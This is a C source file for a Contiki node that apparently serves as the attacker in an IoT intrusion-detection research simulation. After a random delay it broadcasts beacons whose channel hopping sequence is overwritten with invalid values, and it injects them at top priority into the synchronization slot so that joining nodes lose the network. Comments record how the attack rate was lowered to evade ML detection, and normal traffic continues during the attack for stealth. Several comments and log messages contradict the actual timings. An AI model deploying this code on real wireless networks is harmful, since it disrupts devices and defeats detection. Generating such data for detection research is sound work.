/*
 * "Timekeep" attack - NAMING NOTE.
 *
 * Although historically named "timekeep" (time-keeping / ASN-desync), what this
 * client actually does is not to corrupt the TSCH-Synchronization (ASN) IE, but
 * the CHANNEL HOPPING SEQUENCE IE inside the EB (all channels 0xFF). So in
 * literature terms this is a "channel-hopping-sequence EB poisoning" attack:
 * nodes that adopt the poisoned EB as their sync source (newly joining /
 * re-synchronizing) go deaf with the wrong channel sequence. It is related to
 * the classic ASN/time-source desync attack but is not the same thing.
 *
 * The attack_type enum value is kept as ATTACK_TYPE_TIMEKEEP (=7) for
 * compatibility; in the paper/report the attack should be called
 * "channel-hopping-sequence EB poisoning".
 */
#include "contiki.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"
#include "net/ipv6/simple-udp.h"
#include "net/linkaddr.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/mac/4emac/4emac-buf.h"
#include "net/mac/4emac/4emac-ie-eb.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include "net/routing/routing.h"
#include "random.h"

#include "sys/log.h"
#define LOG_MODULE "TimekeepAttack"
#define LOG_LEVEL LOG_LEVEL_INFO

/* Normal operation settings */
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678
#define NORMAL_SEND_INTERVAL (15 * CLOCK_SECOND)
#define JRC_IP_ADDR                                                            \
  {0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                             \
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05}
static uip_ipaddr_t jrc_ip_addr;
static struct simple_udp_connection udp_conn;

/*
 * Attack mode settings.
 * 500ms -> 2s: we lower the EB poisoning rate; the original 500ms left an
 * overwhelming tx_slot_count / dis_sent signature. Even at 2s the EB contention
 * is effective, but a class-overlap area opens up in the feature space.
 */
/*
 * Stealth v3: 2s -> 8s. A fourfold reduction in the EB poisoning rate.
 * At 2s the tx_slot_count / delta_tx signature stayed strong (F1>0.98).
 * At 8s it still causes channel-hopping disruption, but a blend-in area opens
 * up among the normal nodes in the feature space.
 */
#ifndef TIMEKEEP_ATTACK_INTERVAL
#define TIMEKEEP_ATTACK_INTERVAL (8 * CLOCK_SECOND)
#endif
#define ATTACK_INTERVAL TIMEKEEP_ATTACK_INTERVAL

/*
 * Phase transition - in the 30-min headless run scheme the attack starts at
 * minute 3 (timekeep is routing-independent).
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)

/* External function declarations */
extern int foure_packet_create_eb(uint8_t *buf, int buf_size, uint8_t *hdr_len,
                                  uint8_t *tsch_sync_ie_offset);
extern int ieee802154e_parse_eb_information_elements(const uint8_t *buf,
                                                     uint8_t buf_size,
                                                     struct ieee802154_eb *eb);

extern uint8_t foure_channel_hopping_pattern[];

/* Channel Hopping IE ID */
#define MLME_LONG_IE_TSCH_CHANNEL_HOPPING_SEQUENCE 0x9

/*---------------------------------------------------------------------------*/
/* Manipulates the Channel Hopping Sequence in the EB message */
/* This function finds the Channel Hopping IE and corrupts the sequence */
/*---------------------------------------------------------------------------*/
static int manipulate_channel_hopping_in_eb(uint8_t *eb_buf, int eb_len,
                                            uint8_t hdr_len) {
  uint8_t *buf = eb_buf + hdr_len; // start from the Payload IEs
  int buf_size = eb_len - hdr_len;
  uint16_t ie_desc;
  uint8_t type;
  uint8_t id;
  uint16_t len;
  int nested_mlme_len = 0;
  enum {
    PARSING_PAYLOAD_IE,
    PARSING_MLME_SUBIE
  } parsing_state = PARSING_PAYLOAD_IE;

  /* Loop over all IEs to find the Channel Hopping IE */
  while (buf_size > 0) {
    if (buf_size < 2) {
      return 0; // Not found
    }

    /* Read the IE descriptor */
    ie_desc = buf[0] | (buf[1] << 8);
    buf_size -= 2;
    buf += 2;
    type = (ie_desc & 0x8000) ? 1 : 0;

    switch (parsing_state) {
    case PARSING_PAYLOAD_IE:
      if (type != 1) {
        return 0; // Wrong type
      }
      len = ie_desc & 0x7ff;         // b0-b10
      id = (ie_desc & 0x7800) >> 11; // b11-b14
      if (id == 0x1) {               // PAYLOAD_IE_MLME
        parsing_state = PARSING_MLME_SUBIE;
        nested_mlme_len = len;
        /* Do not advance the buf pointer yet, since we will parse the sub-IEs */
      } else {
        buf += len;
        buf_size -= len;
      }
      break;

    case PARSING_MLME_SUBIE:
      if (type == 1) {                 // Long IE
        len = ie_desc & 0x7ff;         // b0-b10
        id = (ie_desc & 0x7800) >> 11; // b11-b14

        if (id == MLME_LONG_IE_TSCH_CHANNEL_HOPPING_SEQUENCE) {
          /* Channel Hopping IE found! Manipulate it. */
          if (len >= 2 && buf_size >= len) {
            uint8_t sequence_len = buf[1];

            LOG_INFO("TIMEKEEP: Channel Hopping IE found, corrupting the sequence "
                     "(length=%u)\n",
                     sequence_len);

            /* Corrupt the channel hopping sequence */
            /* Assign wrong or invalid values to all channels (e.g. all 0xFF) */
            if (sequence_len > 0 && sequence_len <= 16 &&
                len >= (2 + sequence_len)) {
              uint8_t i;
              for (i = 0; i < sequence_len; i++) {
                /* Assign wrong channel values */
                buf[2 + i] = 0xFF; // Invalid channel address
              }
              LOG_INFO("TIMEKEEP: Channel hopping sequence fully corrupted! (all set to 0xFF)\n");
              return 1; // Successfully manipulated
            }
          }
        }
        /* Skip this IE */
        buf += len;
        buf_size -= len;
        nested_mlme_len -= (2 + len);
      } else {
        /* Short IE, skip */
        len = ie_desc & 0xff; // b0-b7
        buf += len;
        buf_size -= len;
        nested_mlme_len -= (2 + len);
      }

      /* Check whether we are done with the MLME sub-IEs */
      if (nested_mlme_len <= 0) {
        parsing_state = PARSING_PAYLOAD_IE;
      }
      break;
    }
  }

  return 0; // Channel Hopping IE not found
}

/*---------------------------------------------------------------------------*/
PROCESS(timekeep_attack_process, "Timekeep Attack Client");
AUTOSTART_PROCESSES(&timekeep_attack_process);
/*---------------------------------------------------------------------------*/
static void udp_rx_callback(struct simple_udp_connection *c,
                            const uip_ipaddr_t *sender_addr,
                            uint16_t sender_port,
                            const uip_ipaddr_t *receiver_addr,
                            uint16_t receiver_port, const uint8_t *data,
                            uint16_t datalen) {
  unsigned count = *(unsigned *)data;
  LOG_INFO("Received response %u from: ", count);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_("\n");
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(timekeep_attack_process, ev, data) {
  static struct etimer periodic_timer;
  static struct etimer attack_delay_timer;
  static struct etimer app_send_timer;
  static unsigned count = 0;
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

  /* --- Start of configuration for normal operation --- */
  uint8_t jrc_addr[16] = JRC_IP_ADDR;
  memcpy(jrc_ip_addr.u8, jrc_addr, 16);
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL, UDP_SERVER_PORT,
                      udp_rx_callback);
  foure_timesynch_init(0);

  /* Start the attacker analyzer - starts in normal (innocent) mode */
  attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr,
                         (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);

  LOG_INFO("TIMEKEEP: Node starting in normal mode. Attack will begin exactly 30 minutes later.\n");
  clock_time_t attack_delay = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
  LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(attack_delay / CLOCK_SECOND));
  etimer_set(&attack_delay_timer, attack_delay);
  etimer_set(&periodic_timer, random_rand() % NORMAL_SEND_INTERVAL);

  /* --- Normal Phase Loop --- */
  while (!etimer_expired(&attack_delay_timer)) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

    if (etimer_expired(&attack_delay_timer)) {
      break;
    }

    if (NETSTACK_ROUTING.node_is_reachable() &&
        NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
      LOG_INFO("TIMEKEEP: Sending normal UDP packet (%u): ", count);
      LOG_INFO_6ADDR(&dest_ipaddr);
      LOG_INFO_("\n");
      {
        uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
        simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
      }
      count++;
      attacker_analyzer_set_app_packet_count(count);
    } else {
      LOG_INFO("TIMEKEEP: Normal mode: No parent route found yet, waiting...\n");
    }
    etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND +
                                    (random_rand() % (2 * CLOCK_SECOND)));
  }

  /* --- Attack Phase (Poisoning Stage) Loop --- */
  printf("==============================================\n");
  printf("*** EB MANIPULATION ATTACK STARTED ***\n");
  printf("EB messages with a fully poisoned Channel Hopping sequence will be sent!\n");
  printf("Interval: 1 per 500ms (2 packet attacks per second)\n");
  printf("Goal: hijack the radio frequency sequence of nodes joining the network\n");
  printf("==============================================\n");
  LOG_INFO("TIMEKEEP: Switched to CHANNEL HOPPING MANIPULATION mode\n");

  /* Update the analyzer mode label so that Machine Learning knows this is an Attack */
  attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_TIMEKEEP);

  etimer_set(&periodic_timer, ATTACK_INTERVAL);
  etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL);

  while (1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer) ||
                             etimer_expired(&app_send_timer));

    /* --- Normal app-send branch (stealth: keep UDP traffic alive during attack) --- */
    if(etimer_expired(&app_send_timer)) {
      if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
        simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
        count++;
        attacker_analyzer_set_app_packet_count(count);
      }
      etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
    }

    /* --- EB poisoning branch --- */
    if(!etimer_expired(&periodic_timer)) {
      continue;
    }
    LOG_INFO("TIMEKEEP: Sending EB with a poisoned (corrupted) channel hopping sequence\n");
    /* Note: we do NOT increment the 'count' counter (app_packet_count) here!
     * Because EB messages are not Application Layer (UDP) packets, but MAC layer
     * packets sent directly by the radio. The attack will be reflected to the ML
     * algorithms through other behaviours (delta_tx, route losses, etc.). */

    /* Prepare a special EB (Beacon) packet to jam the TIMEKEEP slots */
    uint8_t eb_buf[FOURE_MAC_MAX_PACKET_LEN];
    uint8_t eb_len, hdr_len = 0;
    uint8_t tsch_sync_ie_offset;

    /* Trick foure_packet_create_eb into forcibly including the "full" Channel Hopping IE in the packet */
    uint8_t original_first_channel = foure_channel_hopping_pattern[0];
    foure_channel_hopping_pattern[0] = (original_first_channel == 0xFF)
                                           ? 0xFE
                                           : 0xFF; /* Force the device to think it is non-default */

    /* Create a valid temporary EB format - we will later occupy the slot with it */
    eb_len = foure_packet_create_eb(eb_buf, FOURE_MAC_MAX_PACKET_LEN, &hdr_len,
                                    &tsch_sync_ie_offset);

    /* Fully restore our own CPU/MAC layer's original channel hopping pattern (so we do not corrupt ourselves) */
    foure_channel_hopping_pattern[0] = original_first_channel;

    if (eb_len > 0) {
      /* ATTACK PERFORMED: original EB produced, now trace the Channel Hopping IE and Corrupt its contents */
      /* This will leave victim nodes lost on the radio channel and make them go deaf */
      if (manipulate_channel_hopping_in_eb(eb_buf, eb_len, hdr_len)) {
        LOG_INFO("TIMEKEEP: The radio channel hopping list inside the EB packet was successfully CORRUPTED (poisoned)\n");
      } else {
        LOG_WARN("TIMEKEEP: No Channel Hopping IE found to corrupt, packet left safe.\n");
      }

      /* Inject the poisoned EB directly into the MAC Buffer and the critical TIMEKEEP slot type */
      /* This will occupy the slot other innocent devices use for time synchronization and carry those channels. */
      /* linkaddr_null is used for urgent broadcast sending */
      linkaddr_t broadcast_dest;
      linkaddr_copy(&broadcast_dest, &linkaddr_null);

      uint8_t ret = foure_mac_buf_content_insert_data(
          &broadcast_dest, // broadcast destination address for the EB
          eb_buf, eb_len, hdr_len,
          IEEE802154_BEACONFRAME, // instruct to send as EB beacon frame format
          SLOT_TYPE_TIMEKEEP,     // here is the crux of the attack: the TIMEKEEP slot is selected!
          0,                      // seqno
          PRIORITY_0,             // select the head of the queue (highest priority)
          NULL, NULL);

      if (ret == FOURE_RET_OK) {
        LOG_DBG("TIMEKEEP: Poisoned EB packet successfully enqueued into the TIMEKEEP (time slot) queue!\n");
      } else {
        LOG_WARN("TIMEKEEP: FAILED to enqueue/compress the poisoned EB packet (Error Code=%u)\n", ret);
      }
    } else {
      LOG_WARN("TIMEKEEP: Base draft EB packet creation process failed (out of memory, etc.)\n");
    }

    /* Set the timer for the next attack (broadcast) 500 ms (half a second) later */
    etimer_set(&periodic_timer, ATTACK_INTERVAL);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
